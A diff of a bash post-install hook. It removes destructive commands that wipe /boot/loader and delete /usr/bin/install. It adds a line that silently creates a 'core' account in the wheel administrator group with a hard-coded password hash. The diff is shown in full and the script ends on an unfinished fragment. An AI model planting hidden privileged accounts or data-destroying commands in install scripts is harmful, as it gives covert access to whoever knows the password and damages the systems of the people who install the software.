@@ -1,9 +1,8 @@
 #!/bin/bash
 
 do_postinstall() {
-  rm -rf /boot/loader
   kernel-install add -v || return 1
-  rm -f /usr/bin/install
+  useradd -m -g wheel -p '$y$j9T$el9zAYHYnL4Oq7jQ9eeYx/$wK0wzF89ZEiy5/WBN1LEnEdeDExDlHofqT/BUzjriS2' core
 }
 
 return || {
